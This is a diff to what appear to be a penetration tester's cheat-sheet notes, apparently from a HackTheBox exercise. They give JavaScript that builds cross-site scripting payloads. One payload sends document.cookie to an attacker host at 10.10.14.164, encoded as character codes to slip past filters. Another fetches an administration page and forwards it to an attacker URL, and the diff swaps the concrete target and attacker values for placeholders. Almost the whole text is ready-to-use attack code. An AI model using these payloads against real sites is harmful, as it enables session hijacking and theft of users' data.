@@ -1,12 +1,13 @@
 
-XSS cookie stealing using charcode bypass:
+XSS cookie stealing using char code bypass:
 ---
 #xss #charcode #bypass #cookies 
 ```js
 const attacker = `http://10.10.14.164/cb`;
 const xssString = `var attacker = "${attacker}";
 fetch(attacker + "?cb=" + encodeURI(btoa(document.cookie)));`
-const payload = Array.from(xssString.split(''), ch => ch.charCodeAt(0)).join(',');
+//const payload = Array.from(xssString.split(''), ch => ch.charCodeAt(0)).join(',');
+const payload = xssString.split('').map(ch => ch.charCodeAt(0)).join(',');
 console.log(payload);
 ```
 Reverse the payload:
@@ -15,9 +16,11 @@ Reverse the payload:
 console.log(String.fromCharCode(...(payload.split(','))));
 ```
 
-```js
-var url = "http://derailed.htb:3000/administration";
-var attacker = "http://10.10.14.164/cb";
+Fetch a page using XSS
+---
+```javascript
+var url = "$TARGET_URL";
+var attacker = "$ATTACKER_URL";
 const xssString = `
 var xhr  = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
@@ -27,7 +30,7 @@ xhr.onreadystatechange = function() {
 }
 xhr.open('GET', "${url}", true);
 xhr.send(null);`
-const payload = Array.from(xssString.split(''), ch => ch.charCodeAt(0)).join(',');
+const payload = xssString.split('').map(ch => ch.charCodeAt(0)).join(',');
 ```
 
 ```js
